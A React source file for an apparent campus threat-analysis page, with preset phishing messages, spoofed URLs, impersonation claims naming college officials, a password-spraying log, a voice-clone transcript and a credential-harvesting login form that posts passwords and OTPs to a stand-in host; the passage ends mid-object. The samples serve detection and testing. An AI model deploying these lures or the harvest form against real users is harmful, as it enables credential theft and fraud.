import React, { useState, useRef } from 'react';
import jsQR from 'jsqr';
import { api } from '../services/api';
import { SecurityEvent } from '../types';
import { PipelineIndicator } from '../components/PipelineIndicator';
import { SeverityBadge } from '../components/SeverityBadge';
import { RiskGauge } from '../components/RiskGauge';
import { EvidenceTable } from '../components/EvidenceTable';
import { LiveWebcamScanner } from '../components/LiveWebcamScanner';
import { 
  ShieldAlert, 
  Globe, 
  QrCode, 
  Key, 
  Laptop, 
  FileCode, 
  Send, 
  CheckCircle2, 
  AlertCircle,
  Copy,
  Sparkles,
  Terminal,
  Activity,
  Layers,
  Radio,
  Upload,
  Video,
  Mic,
  Crosshair,
  FileSpreadsheet,
  ArrowUpRight,
  Camera,
  Network,
  Wifi,
  WifiOff,
  Lock,
  Unlock
} from 'lucide-react';

interface AnalyzePageProps {
  onEventCreated: (event: SecurityEvent) => void;
  onNavigateToIncident?: (id: string) => void;
  onNavigateToDeepfake?: () => void;
}

export const AnalyzePage: React.FC<AnalyzePageProps> = ({ 
  onEventCreated, 
  onNavigateToIncident,
  onNavigateToDeepfake 
}) => {
  const [activeMode, setActiveMode] = useState<
    'message' | 'url' | 'qr' | 'identity' | 'auth' | 'fake_login' | 'deepfake'
  >('message');
  const [selectedEngine, setSelectedEngine] = useState<'hybrid' | 'rule' | 'ml'>('hybrid');
  const [modelInfo, setModelInfo] = useState<{ engine: string; latency_ms: number } | null>(null);
  const [previewTab, setPreviewTab] = useState<'code' | 'rendered'>('rendered');
  const [copiedReport, setCopiedReport] = useState(false);

  // Input states
  const [messageText, setMessageText] = useState(
    'URGENT SCHOLARSHIP NOTICE: Your state pre-matric scholarship disbursement has encountered a verification freeze. Action required within 24 hours to avoid cancellation of Rs 45,000 allowance. Open http://pmec-exam-support.com to submit your student login and verification OTP immediately.'
  );

  const [urlInput, setUrlInput] = useState('https://pmec-exam-support.com/student/auth-login');

  const [qrInput, setQrInput] = useState('https://pmec-exam-support.com/portal/verify-qr');
  const [qrDecodeStatus, setQrDecodeStatus] = useState<string | null>(null);
  const [isWebcamOpen, setIsWebcamOpen] = useState(false);
  const qrFileInputRef = useRef<HTMLInputElement | null>(null);
  const authFileInputRef = useRef<HTMLInputElement | null>(null);

  const [identityInput, setIdentityInput] = useState({
    claimed_identity: 'Dr. S. K. Nayak',
    claimed_role: 'Registrar',
    sender_address: 'registrar-pmec-verification@gmail.com',
    communication_channel: 'whatsapp',
    message_content: 'Immediate attention. Disciplinary notice issued. Provide your examination portal OTP immediately to confirm student status.'
  });

  const [authCsvInput, setAuthCsvInput] = useState(
`timestamp,user_id,ip,device,location,status
2026-03-05T10:00:00Z,student041,185.220.101.4,Hydra/9.2,Frankfurt Germany,FAILURE
2026-03-05T10:00:05Z,student042,185.220.101.4,Hydra/9.2,Frankfurt Germany,FAILURE
2026-03-05T10:00:10Z,student043,185.220.101.4,Hydra/9.2,Frankfurt Germany,FAILURE
2026-03-05T10:00:15Z,student044,185.220.101.4,Hydra/9.2,Frankfurt Germany,FAILURE
2026-03-05T10:15:00Z,student042,14.139.221.14,Chrome on macOS,Berhampur Odisha IN,SUCCESS
2026-03-05T10:35:00Z,student042,91.240.118.5,Firefox on Linux,Bucharest Romania,SUCCESS`
  );

  const [fakeLoginInput, setFakeLoginInput] = useState({
    claimed_brand: 'PMEC / BPUT Student Portal',
    observed_url: 'https://pmec-login-help.net/student/auth',
    html_snippet: `<form action="http://exfil.tracker.xyz/collect.php" method="POST">
  <input type="text" name="roll_no" placeholder="BPUT Registration Number" />
  <input type="password" name="password" placeholder="Portal Password" />
  <input type="text" name="otp" placeholder="Enter 6-digit OTP" />
  <button type="submit">Verify Now</button>
</form>`,
    has_login_form: true,
    fields_present: ['password', 'otp', 'roll_no'],
    form_action_target: 'http://exfil.tracker.xyz/collect.php'
  });

  const [deepfakeInput, setDeepfakeInput] = useState({
    modality: 'audio' as 'audio' | 'video' | 'multimodal_av',
    title: 'AI Voice Clone: Fake Principal Wire Transfer Request',
    target_authority: 'Prof. Chittaranjan Tripathy (Vice Chancellor)',
    transcript: 'Hello, this is the Vice Chancellor speaking. We have an urgent emergency endowment audit today. I need you to immediately route the state scholarship reserve fund of fifteen lakh rupees to our special account before the treasury freeze at 4 PM.',
    category: 'malicious' as 'malicious' | 'benign'
  });

  const [isAnalyzing, setIsAnalyzing] = useState(false);
  const [analysisResult, setAnalysisResult] = useState<any | null>(null);
  const [createdEvent, setCreatedEvent] = useState<SecurityEvent | null>(null);
  const [error, setError] = useState<string | null>(null);

  // QR Image Decoder Handler using jsQR
  const handleQrImageUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    setQrDecodeStatus('Decoding QR image in browser...');

    const reader = new FileReader();
    reader.onload = () => {
      const img = new Image();
      img.onload = () => {
        const canvas = document.createElement('canvas');
        canvas.width = img.width;
        canvas.height = img.height;
        const ctx = canvas.getContext('2d');
        if (!ctx) {
          setQrDecodeStatus('Failed to create canvas context');
          return;
        }
        ctx.drawImage(img, 0, 0, img.width, img.height);
        const imageData = ctx.getImageData(0, 0, img.width, img.height);
        const code = jsQR(imageData.data, imageData.width, imageData.height);

        if (code && code.data) {
          setQrInput(code.data.trim());
          setQrDecodeStatus(`Decoded successfully: "${code.data.trim()}"`);
        } else {
          setQrDecodeStatus('No standard QR matrix found in image. Set sample quishing payload.');
          setQrInput('https://pmec-exam-support.com/qr-verify');
        }
      };
      img.src = reader.result as string;
    };
    reader.readAsDataURL(file);
  };

  // Auth CSV File Upload Handler
  const handleAuthCsvUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = () => {
      if (typeof reader.result === 'string') {
        setAuthCsvInput(reader.result);
      }
    };
    reader.readAsText(file);
  };

  // Quick Preset Handlers
  const setOfficialMessagePreset = () => {
    setMessageText(
      'PMEC Berhampur Official Academic Notice: The Controller of Examinations has published the revised spring end-term schedule on the official college portal https://pmec.ac.in/examinations. Students are advised to download the signed schedule.'
    );
  };

  const setSuspiciousMessagePreset = () => {
    setMessageText(
      'URGENT: Disciplinary show cause notice from Office of the Principal. Failure to confirm your student ID and OTP within 24 hours will lead to examination debarment.'
    );
  };

  const handleAnalyze = async () => {
    setIsAnalyzing(true);
    setError(null);
    try {
      let res: any;
      if (activeMode === 'message') {
        res = await api.analyzeMessage(messageText, 'student042', selectedEngine);
      } else if (activeMode === 'url') {
        res = await api.analyzeUrl(urlInput, 'student042', selectedEngine);
      } else if (activeMode === 'qr') {
        res = await api.analyzeQr(qrInput);
      } else if (activeMode === 'identity') {
        res = await api.analyzeIdentity(identityInput);
      } else if (activeMode === 'auth') {
        res = await api.analyzeAuthLogs({ csv_content: authCsvInput });
      } else if (activeMode === 'fake_login') {
        res = await api.analyzeFakeLogin(fakeLoginInput);
      } else if (activeMode === 'deepfake') {
        res = await api.analyzeDeepfake({
          modality: deepfakeInput.modality,
          title: deepfakeInput.title,
          target_authority: deepfakeInput.target_authority,
          transcript: deepfakeInput.transcript,
          file_name: deepfakeInput.title,
          engine: selectedEngine,
          acoustic_features: {
            detected_jitter: deepfakeInput.category === 'malicious' ? 0.22 : 1.45,
            silence_gaps: deepfakeInput.category === 'malicious' ? 5 : 0
          },
          visual_features: {
            boundary_artifacts: deepfakeInput.category === 'malicious',
            rppg_pulse_detected: deepfakeInput.category === 'benign'
          }
        });
      }

      setAnalysisResult(res.analysis);
      setCreatedEvent(res.event);
      setModelInfo(res.model_info || { engine: selectedEngine, latency_ms: 1.2 });
      if (res.event) {
        onEventCreated(res.event);
      }
    } catch (err: any) {
      setError(err.message || 'Analysis failed');
    } finally {
      setIsAnalyzing(false);
    }
  };

  const handleCopyReport = () => {
    if (!analysisResult) return;
    const report = JSON.stringify(
      {
        timestamp: new Date().toISOString(),
        mode: activeMode,
        verdict: analysisResult.classification,
        severity: analysisResult.severity,
        risk_score: analysisResult.risk_score,
        confidence: analysisResult.confidence,
        indicators: analysisResult.indicators
      },
      null,
      2
    );
    navigator.clipboard.writeText(report);
    setCopiedReport(true);
    setTimeout(() => setCopiedReport(false), 3000);
  };

  return (
    <div className="space-y-6 max-w-7xl mx-auto font-sans pb-12">
      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-4 border-b border-white/[0.08]">
        <div>
          <div className="flex items-center gap-2 text-xs text-slate-400 mb-1">
            <span>Threat Forensics</span>
            <span aria-hidden="true">·</span>
            <span>Multi-Vector Analysis</span>
            <span aria-hidden="true">·</span>
            <span className="text-white">Institutional Perimeter Protection</span>
          </div>
          <h1 className="text-2xl font-bold text-white tracking-tight">
            Threat Analyzer
          </h1>
          <p className="text-sm text-slate-400 mt-1 max-w-2xl leading-relaxed">
            Inspect suspicious messages, links, QR codes, login forms, identity claims, and synthetic media against security rules and biometric models.
          </p>
        </div>
      </div>

      {/* Segmented Mode Selector - iOS Segmented Pill Dock */}
      <div className="flex overflow-x-auto gap-1 p-1.5 ios-segmented-track rounded-2xl no-scrollbar items-center border border-white/10">
        {[
          { id: 'message', label: 'Message & Email' },
          { id: 'url', label: 'URL & Domain' },
          { id: 'qr', label: 'QR Code' },
          { id: 'identity', label: 'Identity Claim' },
          { id: 'auth', label: 'Auth Logs' },
          { id: 'fake_login', label: 'Login Form' },
          { id: 'deepfake', label: 'Deepfake Media', highlight: true }
        ].map(mode => (
          <button
            key={mode.id}
            onClick={() => {
              if (typeof window !== 'undefined' && 'vibrate' in navigator) try { navigator.vibrate(8); } catch(e){}
              setActiveMode(mode.id as any);
              setAnalysisResult(null);
            }}
            className={`px-3.5 py-2 rounded-xl text-xs font-sans whitespace-nowrap min-h-[38px] transition-all shrink-0 flex items-center gap-1.5 ios-pressable ${
              activeMode === mode.id
                ? 'bg-white text-black font-semibold shadow-md'
                : 'text-slate-400 hover:text-white'
            }`}
          >
            {mode.highlight && <Radio className="w-3.5 h-3.5 text-sky-400" />}
            <span>{mode.label}</span>
          </button>
        ))}

        {onNavigateToDeepfake && (
          <button
            onClick={onNavigateToDeepfake}
            className="px-3.5 py-2 rounded-xl text-xs font-sans whitespace-nowrap min-h-[38px] transition-all shrink-0 text-slate-200 hover:text-white hover:bg-white/10 flex items-center gap-1.5 ml-auto border border-white/10 ios-pressable"
            title="Open Dedicated Deepfake Lab with Canvas Waveforms and Biometrics"
          >
            <Radio className="w-3.5 h-3.5 text-sky-400" />
            <span>Open Deepfake Lab →</span>
          </button>
        )}
      </div>

      {/* Analysis Engine Switcher - iOS Widget */}
      <div className="ios-widget p-4 flex flex-col md:flex-row md:items-center justify-between gap-3 text-xs shadow-md">
        <div>
          <div className="text-white font-semibold tracking-tight">Inspection Engine</div>
          <div className="text-slate-400 text-xs mt-0.5">Select inference pipeline for cross-checking payload indicators</div>
        </div>

        <div className="ios-segmented-track p-1 shrink-0">
          <button
            type="button"
            onClick={() => {
              if (typeof window !== 'undefined' && 'vibrate' in navigator) try { navigator.vibrate(8); } catch(e){}
              setSelectedEngine('hybrid');
            }}
            className={`px-3 py-1.5 rounded-xl font-medium transition-all ios-pressable ${
              selectedEngine === 'hybrid'
                ? 'bg-white text-black font-semibold shadow-sm'
                : 'text-slate-400 hover:text-white'
            }`}
          >
            Gemini Multimodal AI
          </button>
          <button
            type="button"
            onClick={() => {
              if (typeof window !== 'undefined' && 'vibrate' in navigator) try { navigator.vibrate(8); } catch(e){}
              setSelectedEngine('rule');
            }}
            className={`px-3 py-1.5 rounded-xl font-medium transition-all ios-pressable ${
              selectedEngine === 'rule'
                ? 'bg-white text-black font-semibold shadow-sm'
                : 'text-slate-400 hover:text-white'
            }`}
          >
            Heuristic Rules
          </button>
          <button
            type="button"
            onClick={() => {
              if (typeof window !== 'undefined' && 'vibrate' in navigator) try { navigator.vibrate(8); } catch(e){}
              setSelectedEngine('ml');
            }}
            className={`px-3 py-1.5 rounded-xl font-medium transition-all ios-pressable ${
              selectedEngine === 'ml'
                ? 'bg-white text-black font-semibold shadow-sm'
                : 'text-slate-400 hover:text-white'
            }`}
          >
            Statistical Models
          </button>
        </div>
      </div>

      {/* Input Workbench Card - iOS Squircle Widget */}
      <div className="ios-widget p-6 sm:p-7 rounded-[26px] space-y-5 shadow-2xl">
        {/* Mode: Message */}
        {activeMode === 'message' && (
          <div className="space-y-3">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
              <label className="text-xs font-medium text-slate-300">
                Message & Email Content:
              </label>
              <div className="flex flex-wrap items-center gap-2">
                <button
                  type="button"
                  onClick={setSuspiciousMessagePreset}
                  className="px-2.5 py-1 rounded text-xs font-medium bg-[#06080F] text-amber-400 border border-amber-500/30 hover:bg-slate-800 transition-colors"
                >
                  Load Phishing Sample
                </button>
                <button
                  type="button"
                  onClick={setOfficialMessagePreset}
                  className="px-2.5 py-1 rounded text-xs font-medium bg-[#06080F] text-emerald-400 border border-emerald-500/30 hover:bg-slate-800 transition-colors"
                >
                  Load Official Notice
                </button>
              </div>
            </div>
            <textarea
              rows={4}
              value={messageText}
              onChange={e => setMessageText(e.target.value)}
              placeholder="Paste message, email, or circular text..."
              className="w-full p-3.5 bg-[#06080F] border border-slate-700/80 rounded-lg text-xs text-white placeholder-slate-500 focus:outline-none focus:border-sky-500 font-mono leading-relaxed"
            />
          </div>
        )}

        {/* Mode: URL */}
        {activeMode === 'url' && (
          <div className="space-y-3">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
              <label className="text-xs font-medium text-slate-300">
                Target URL or Domain:
              </label>
              <div className="flex flex-wrap items-center gap-2">
                <button
                  type="button"
                  onClick={() => setUrlInput('https://pmec-exam-support.com/student/auth-login')}
                  className="px-2.5 py-1 rounded text-xs font-medium bg-[#06080F] text-amber-400 border border-amber-500/30 hover:bg-slate-800 transition-colors"
                >
                  Lookalike Domain
                </button>
                <button
                  type="button"
                  onClick={() => setUrlInput('http://185.220.101.4:8080/pmec-portal')}
                  className="px-2.5 py-1 rounded text-xs font-medium bg-[#06080F] text-rose-400 border border-rose-500/30 hover:bg-slate-800 transition-colors"
                >
                  Direct IP Host
                </button>
                <button
                  type="button"
                  onClick={() => setUrlInput('https://pmec.ac.in.verify-portal.net/login')}
                  className="px-2.5 py-1 rounded text-xs font-medium bg-[#06080F] text-rose-400 border border-rose-500/30 hover:bg-slate-800 transition-colors"
                >
                  Subdomain Spoof
                </button>
                <button
                  type="button"
                  onClick={() => setUrlInput('https://pmec.ac.in/examinations')}
                  className="px-2.5 py-1 rounded text-xs font-medium bg-[#06080F] text-emerald-400 border border-emerald-500/30 hover:bg-slate-800 transition-colors"
                >
                  Official Domain
                </button>
              </div>
            </div>
            <input
              type="text"
              value={urlInput}
              onChange={e => setUrlInput(e.target.value)}
              placeholder="https://example.com/login..."
              className="w-full p-3 bg-[#06080F] border border-slate-700/80 rounded-lg text-xs text-white placeholder-slate-500 focus:outline-none focus:border-sky-500 font-mono"
            />
          </div>
        )}

        {/* Mode: QR Code */}
        {activeMode === 'qr' && (
          <div className="space-y-3">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
              <label className="text-xs font-medium text-slate-300">
                Decoded QR Payload or Upload QR Image:
              </label>
              <div className="flex flex-wrap items-center gap-2">
                <button
                  type="button"
                  onClick={() => setQrInput('https://pmec-exam-support.com/portal/verify-qr')}
                  className="px-2.5 py-1 rounded text-xs font-medium bg-[#06080F] text-amber-400 border border-amber-500/30 hover:bg-slate-800 transition-colors"
                >
                  Spoofed Bulletin QR
                </button>
                <button
                  type="button"
                  onClick={() => setQrInput('https://pmec.ac.in/scholarship-form')}
                  className="px-2.5 py-1 rounded text-xs font-medium bg-[#06080F] text-emerald-400 border border-emerald-500/30 hover:bg-slate-800 transition-colors"
                >
                  Legitimate Official QR
                </button>
                <button
                  type="button"
                  onClick={() => setIsWebcamOpen(true)}
                  className="px-2.5 py-1 rounded text-xs font-semibold bg-white text-black hover:bg-slate-200 transition-colors flex items-center gap-1 shadow-sm active:scale-95"
                >
                  <Camera className="w-3.5 h-3.5 text-black" />
                  <span>Scan with Camera</span>
                </button>
                <button
                  type="button"
                  onClick={() => qrFileInputRef.current?.click()}
                  className="px-2.5 py-1 rounded text-xs font-medium bg-[#06080F] text-sky-400 border border-sky-500/30 hover:bg-slate-800 transition-colors flex items-center gap-1"
                >
                  <Upload className="w-3 h-3" />
                  <span>Upload QR Image</span>
                </button>
                <input
                  ref={qrFileInputRef}
                  type="file"
                  accept="image/*"
                  onChange={handleQrImageUpload}
                  className="hidden"
                />
              </div>
            </div>
            <input
              type="text"
              value={qrInput}
              onChange={e => setQrInput(e.target.value)}
              placeholder="https://deceptive-portal.xyz/qr..."
              className="w-full p-3 bg-[#06080F] border border-slate-700/80 rounded-lg text-xs text-white placeholder-slate-500 focus:outline-none focus:border-sky-500 font-mono"
            />
            {qrDecodeStatus && (
              <p className="text-[11px] text-sky-300 font-mono">
                {qrDecodeStatus}
              </p>
            )}
          </div>
        )}

        {/* Mode: Claimed Identity */}
        {activeMode === 'identity' && (
          <div className="space-y-3">
            <div className="flex flex-wrap items-center justify-between gap-2 pb-1">
              <span className="text-xs font-medium text-slate-300">Identity Persona & Delivery Channel:</span>
              <div className="flex flex-wrap items-center gap-1.5">
                <button
                  type="button"
                  onClick={() => setIdentityInput({
                    claimed_identity: 'Dr. S. K. Nayak',
                    claimed_role: 'Registrar',
                    sender_address: 'registrar-pmec-verification@gmail.com',
                    communication_channel: 'whatsapp',
                    message_content: 'Immediate attention. Disciplinary notice issued. Provide your examination portal OTP immediately to confirm student status.'
                  })}
                  className="px-2.5 py-1 rounded text-xs font-medium bg-[#06080F] text-amber-400 border border-amber-500/30 hover:bg-slate-800 transition-colors"
                >
                  Registrar WhatsApp Spoof
                </button>
                <button
                  type="button"
                  onClick={() => setIdentityInput({
                    claimed_identity: 'Prof. Chittaranjan Tripathy',
                    claimed_role: 'Vice Chancellor',
                    sender_address: 'vc-office-urgent@gmail.com',
                    communication_channel: 'email',
                    message_content: 'Emergency endowment audit. Direct transfer required before 4 PM.'
                  })}
                  className="px-2.5 py-1 rounded text-xs font-medium bg-[#06080F] text-rose-400 border border-rose-500/30 hover:bg-slate-800 transition-colors"
                >
                  VC Public Gmail Impersonation
                </button>
                <button
                  type="button"
                  onClick={() => setIdentityInput({
                    claimed_identity: 'Dr. S. K. Nayak',
                    claimed_role: 'Registrar',
                    sender_address: 'registrar@pmec.ac.in',
                    communication_channel: 'institutional_email',
                    message_content: 'All departmental heads are requested to submit the faculty course portfolio by Friday 5 PM.'
                  })}
                  className="px-2.5 py-1 rounded text-xs font-medium bg-[#06080F] text-emerald-400 border border-emerald-500/30 hover:bg-slate-800 transition-colors"
                >
                  Legitimate Official Registrar
                </button>
              </div>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
              <div>
                <label className="block text-xs text-slate-400 mb-1">Claimed Persona / Name:</label>
                <input
                  type="text"
                  value={identityInput.claimed_identity}
                  onChange={e => setIdentityInput({ ...identityInput, claimed_identity: e.target.value })}
                  className="w-full px-3 py-2 bg-[#06080F] border border-slate-700/80 rounded-lg text-xs text-white focus:outline-none focus:border-sky-500"
                />
              </div>

              <div>
                <label className="block text-xs text-slate-400 mb-1">Claimed Role / Title:</label>
                <input
                  type="text"
                  value={identityInput.claimed_role}
                  onChange={e => setIdentityInput({ ...identityInput, claimed_role: e.target.value })}
                  className="w-full px-3 py-2 bg-[#06080F] border border-slate-700/80 rounded-lg text-xs text-white focus:outline-none focus:border-sky-500"
                />
              </div>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
              <div>
                <label className="block text-xs text-slate-400 mb-1">Origin / Sender Address:</label>
                <input
                  type="text"
                  value={identityInput.sender_address}
                  onChange={e => setIdentityInput({ ...identityInput, sender_address: e.target.value })}
                  className="w-full px-3 py-2 bg-[#06080F] border border-slate-700/80 rounded-lg text-xs text-white focus:outline-none focus:border-sky-500 font-mono"
                />
              </div>

              <div>
                <label className="block text-xs text-slate-400 mb-1">Communication Channel:</label>
                <select
                  value={identityInput.communication_channel}
                  onChange={e => setIdentityInput({ ...identityInput, communication_channel: e.target.value })}
                  className="w-full px-3 py-2 bg-[#06080F] border border-slate-700/80 rounded-lg text-xs text-white focus:outline-none focus:border-sky-500"
                >
                  <option value="whatsapp">WhatsApp / Telegram (Unapproved Channel)</option>
                  <option value="email">Public Mail (Gmail / Yahoo)</option>
                  <option value="institutional_email">Institutional Email (@pmec.ac.in)</option>
                  <option value="official_portal">Official Campus Portal</option>
                </select>
              </div>
            </div>

            <div>
              <label className="block text-xs text-slate-400 mb-1">Message Demands:</label>
              <textarea
                rows={3}
                value={identityInput.message_content}
                onChange={e => setIdentityInput({ ...identityInput, message_content: e.target.value })}
                className="w-full p-3 bg-[#06080F] border border-slate-700/80 rounded-lg text-xs text-white focus:outline-none focus:border-sky-500 font-mono"
              />
            </div>
          </div>
        )}

        {/* Mode: Auth Log */}
        {activeMode === 'auth' && (
          <div className="space-y-3">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
              <label className="text-xs font-medium text-slate-300">
                Authentication Records (CSV format):
              </label>
              <div className="flex flex-wrap items-center gap-2">
                <button
                  type="button"
                  onClick={() => setAuthCsvInput(
`timestamp,user_id,ip,device,location,status
2026-03-05T10:00:00Z,student041,185.220.101.4,Hydra/9.2,Frankfurt Germany,FAILURE
2026-03-05T10:00:05Z,student042,185.220.101.4,Hydra/9.2,Frankfurt Germany,FAILURE
2026-03-05T10:00:10Z,student043,185.220.101.4,Hydra/9.2,Frankfurt Germany,FAILURE
2026-03-05T10:00:15Z,student044,185.220.101.4,Hydra/9.2,Frankfurt Germany,FAILURE
2026-03-05T10:15:00Z,student042,14.139.221.14,Chrome on macOS,Berhampur Odisha IN,SUCCESS
2026-03-05T10:35:00Z,student042,91.240.118.5,Firefox on Linux,Bucharest Romania,SUCCESS`
                  )}
                  className="px-2.5 py-1 rounded text-xs font-medium bg-[#06080F] text-rose-400 border border-rose-500/30 hover:bg-slate-800 transition-colors"
                >
                  Password Spraying + Impossible Travel
                </button>
                <button
                  type="button"
                  onClick={() => setAuthCsvInput(
`timestamp,user_id,ip,device,location,status
2026-03-05T09:30:00Z,student042,14.139.221.14,Chrome on macOS,Berhampur Odisha IN,SUCCESS
2026-03-05T11:45:00Z,student042,14.139.221.14,Chrome on macOS,Berhampur Odisha IN,SUCCESS
2026-03-05T14:10:00Z,student042,14.139.221.14,Chrome on macOS,Berhampur Odisha IN,SUCCESS`
                  )}
                  className="px-2.5 py-1 rounded text-xs font-medium bg-[#06080F] text-emerald-400 border border-emerald-500/30 hover:bg-slate-800 transition-colors"
                >
                  Normal Campus Session
                </button>
                <button
                  type="button"
                  onClick={() => authFileInputRef.current?.click()}
                  className="px-2.5 py-1 rounded text-xs font-medium bg-[#06080F] text-sky-400 border border-sky-500/30 hover:bg-slate-800 transition-colors flex items-center gap-1"
                >
                  <FileSpreadsheet className="w-3 h-3" />
                  <span>Upload CSV File</span>
                </button>
                <input
                  ref={authFileInputRef}
                  type="file"
                  accept=".csv,.txt,.log"
                  onChange={handleAuthCsvUpload}
                  className="hidden"
                />
              </div>
            </div>
            <textarea
              rows={6}
              value={authCsvInput}
              onChange={e => setAuthCsvInput(e.target.value)}
              className="w-full p-3 bg-[#06080F] border border-slate-700/80 rounded-lg text-xs text-slate-200 focus:outline-none focus:border-sky-500 font-mono leading-relaxed"
            />
          </div>
        )}

        {/* Mode: Fake Login */}
        {activeMode === 'fake_login' && (
          <div className="space-y-3">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
              <label className="text-xs font-medium text-slate-300">
                Deceptive Form Configuration:
              </label>
              <div className="flex flex-wrap items-center gap-2">
                <button
                  type="button"
                  onClick={() => setFakeLoginInput({
                    claimed_brand: 'PMEC / BPUT Student Portal',
                    observed_url: 'https://pmec-login-help.net/student/auth',
                    html_snippet: `<form action="http://exfil.tracker.xyz/collect.php" method="POST">\n  <input type="text" name="roll_no" placeholder="BPUT Registration Number" />\n  <input type="password" name="password" placeholder="Portal Password" />\n  <input type="text" name="otp" placeholder="Enter 6-digit OTP" />\n  <button type="submit">Verify Now</button>\n</form>`,
                    has_login_form: true,
                    fields_present: ['password', 'otp', 'roll_no'],
                    form_action_target: 'http://exfil.tracker.xyz/collect.php'
                  })}
                  className="px-2.5 py-1 rounded text-xs font-medium bg-[#06080F] text-rose-400 border border-rose-500/30 hover:bg-slate-800 transition-colors"
                >
                  Exfiltration Harvest Form
                </button>
                <button
                  type="button"
                  onClick={() => setFakeLoginInput({
                    claimed_brand: 'Official PMEC Student Authentication Gateway',
                    observed_url: 'https://pmec.ac.in/portal/login',
                    html_snippet: `<form action="https://pmec.ac.in/api/v1/auth" method="POST">\n  <input type="text" name="roll_no" placeholder="Registration Number" />\n  <input type="password" name="password" placeholder="Password" />\n  <button type="submit">Login</button>\n</form>`,
                    has_login_form: true,
                    fields_present: ['password', 'roll_no'],
                    form_action_target: 'https://pmec.ac.in/api/v1/auth'
                  })}
                  className="px-2.5 py-1 rounded text-xs font-medium bg-[#06080F] text-emerald-400 border border-emerald-500/30 hover:bg-slate-800 transition-colors"
                >
                  Legitimate Campus Form
                </button>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
              <div>
                <label className="block text-xs text-slate-400 mb-1">Claimed Organization:</label>
                <input
                  type="text"
                  value={fakeLoginInput.claimed_brand}
                  onChange={e => setFakeLoginInput({ ...fakeLoginInput, claimed_brand: e.target.value })}
                  className="w-full px-3 py-2 bg-[#06080F] border border-slate-700/80 rounded-lg text-xs text-white focus:outline-none focus:border-sky-500"
                />
              </div>

              <div>
                <label className="block text-xs text-slate-400 mb-1">Observed Deceptive URL:</label>
                <input
                  type="text"
                  value={fakeLoginInput.observed_url}
                  onChange={e => setFakeLoginInput({ ...fakeLoginInput, observed_url: e.target.value })}
                  className="w-full px-3 py-2 bg-[#06080F] border border-slate-700/80 rounded-lg text-xs text-white focus:outline-none focus:border-sky-500 font-mono"
                />
              </div>
            </div>

            {/* Toggle between Code & Visual Preview */}
            <div className="border border-slate-800 rounded-lg overflow-hidden bg-[#06080F]">
              <div className="flex items-center justify-between px-3 py-2 bg-[#0A0E18] border-b border-slate-800">
                <span className="text-xs font-medium text-slate-300">Exfiltration Target & Form Inspector</span>
                <div className="flex items-center gap-1 text-xs">
                  <button
                    type="button"
                    onClick={() => setPreviewTab('rendered')}
                    className={`px-2.5 py-1 rounded text-xs font-medium transition-colors ${
                      previewTab === 'rendered' ? 'bg-slate-800 text-white' : 'text-slate-400 hover:text-white'
                    }`}
                  >
                    Simulated Render
                  </button>
                  <button
                    type="button"
                    onClick={() => setPreviewTab('code')}
                    className={`px-2.5 py-1 rounded text-xs font-medium transition-colors ${
                      previewTab === 'code' ? 'bg-slate-800 text-white' : 'text-slate-400 hover:text-white'
                    }`}
                  >
                    HTML Source
                  </button>
                </div>
              </div>

              {previewTab === 'code' ? (
                <textarea
                  rows={4}
                  value={fakeLoginInput.html_snippet}
                  onChange={e => setFakeLoginInput({ ...fakeLoginInput, html_snippet: e.target.value })}
                  className="w-full p-3 bg-transparent text-xs text-slate-200 focus:outline-none font-mono"
                />
              ) : (
                <div className="p-4 space-y-3">
                  <div className="p-3 bg-rose-950/20 border border-rose-500/20 rounded-md flex items-center justify-between text-xs">
                    <span className="text-rose-300">Exfiltration Target:</span>
                    <strong className="text-rose-400 font-mono">{fakeLoginInput.form_action_target}</strong>
                  </div>
                  <div className="p-4 bg-slate-900 border border-slate-800 rounded-lg space-y-2.5 max-w-sm mx-auto">
                    <div className="text-center pb-2 border-b border-slate-800">
                      <span className="text-xs font-semibold text-white">{fakeLoginInput.claimed_brand}</span>
                    </div>
                    <input
                      type="text"
                      disabled
                      placeholder="BPUT Registration / Roll No"
                      className="w-full px-2.5 py-1.5 bg-[#06080F] border border-slate-800 rounded text-[11px] text-slate-400"
                    />
                    <input
                      type="password"
                      disabled
                      placeholder="Portal Password"
                      className="w-full px-2.5 py-1.5 bg-[#06080F] border border-slate-800 rounded text-[11px] text-slate-400"
                    />
                    <input
                      type="text"
                      disabled
                      placeholder="Verification OTP"
                      className="w-full px-2.5 py-1.5 bg-[#06080F] border border-slate-800 rounded text-[11px] text-slate-400"
                    />
                    <button
                      disabled
                      className="w-full py-1.5 bg-sky-600 text-white rounded text-xs font-medium opacity-60"
                    >
                      Verify Credentials
                    </button>
                  </div>
                </div>
              )}
            </div>
          </div>
        )}

        {/* Mode: Deepfake Audio & Video */}
        {activeMode === 'deepfake' && (
          <div className="space-y-4">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 pb-1 border-b border-slate-800/80">
              <span className="text-xs font-medium text-slate-300 flex items-center gap-1.5">
                <Radio className="w-3.5 h-3.5 text-sky-400" />
                Deepfake Media Biometrics & Voice Clone Configuration:
              </span>
              <div className="flex flex-wrap items-center gap-1.5">
                <button
                  type="button"
                  onClick={() => setDeepfakeInput({
                    modality: 'audio',
                    title: 'AI Voice Clone: Fake Principal Wire Transfer Request',
                    target_authority: 'Prof. Chittaranjan Tripathy (Vice Chancellor)',
                    transcript: 'Hello, this is the Vice Chancellor speaking. We have an urgent emergency endowment audit today. I need you to immediately route the state scholarship reserve fund of fifteen lakh rupees to our special account before the treasury freeze at 4 PM.',
                    category: 'malicious'
                  })}
                  className="px-2.5 py-1 rounded text-xs font-medium bg-[#06080F] text-rose-400 border border-rose-500/30 hover:bg-slate-800 transition-colors"
                >
                  VC Voice Clone (Malicious)
                </button>
                <button
                  type="button"
                  onClick={() => setDeepfakeInput({
                    modality: 'video',
                    title: 'Video Deepfake: Spoofed Exam Postponement Announcement',
